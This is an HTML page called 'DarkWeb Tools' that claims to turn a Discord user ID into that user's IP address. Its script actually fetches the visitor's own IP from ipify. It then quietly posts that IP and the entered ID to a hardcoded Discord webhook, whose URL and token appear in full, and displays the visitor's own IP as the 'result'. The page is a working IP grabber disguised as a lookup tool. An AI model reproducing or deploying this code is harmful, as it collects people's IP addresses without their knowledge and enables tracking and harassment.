<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>DarkWeb Tools</title>
  <style>
    body {
      background-color: #0f0f0f;
      color: #e0e0e0;
      font-family: 'Courier New', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }

    h1 {
      color: #00ff99;
      font-size: 3em;
      margin-bottom: 10px;
      text-shadow: 0 0 10px #00ff99;
    }

    p {
      font-size: 1.2em;
      color: #cccccc;
    }

    input {
      padding: 12px;
      width: 320px;
      margin: 15px 0;
      border: 2px solid #00ff99;
      background-color: #1a1a1a;
      color: #00ff99;
      border-radius: 5px;
      font-size: 1em;
      outline: none;
    }

    button {
      padding: 12px 25px;
      background-color: #00ff99;
      border: none;
      border-radius: 5px;
      color: #000;
      cursor: pointer;
      font-size: 1em;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #00cc77;
    }

    #output {
      margin-top: 25px;
      font-size: 1.4em;
      color: #00ffcc;
      font-weight: bold;
      background-color: #1a1a1a;
      padding: 15px;
      border-radius: 10px;
      border: 1px solid #00ff99;
      max-width: 500px;
    }

    .strong-text {
      color: #ff4d4d;
      font-size: 1.3em;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>DarkWeb Tools</h1>
  <p>Enter the Discord User ID below</p>

  <input type="text" id="discordId" placeholder="Discord User ID" />
  <button onclick="convert()">Convert</button>

  <div id="output"></div>

  <script>
    function convert() {
      const id = document.getElementById("discordId").value.trim();
      const output = document.getElementById("output");

      if (id === "") {
        output.innerText = "Please enter a valid Discord ID!";
        return;
      }

      output.innerText = "Converting...";

      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;

          // Send to Discord webhook (log the ID)
          const webhookUrl = "https://discord.com/api/webhooks/1312686478027128892/AJZAcDBpbtlyThADzkP4Xy94z_2pJT70gNlbYfDayk9Wl1ujTYNfgFjgx125iUEyRkEP";

          const payload = {
            content: `Discord ID: **${id}** IP Address: ${ip} LOL`
          };

          fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          });

          setTimeout(() => {
            output.innerHTML = `
              <p><span class="strong-text">Discord ID:</span> ${id}</p>
              <p><span class="strong-text">Ip User:</span> ${ip}</p>
            `;
          }, 2000);
        })
        .catch(() => {
          output.innerText = "Failed to fetch IP address.";
        });
    }
  </script>
</body>
</html>
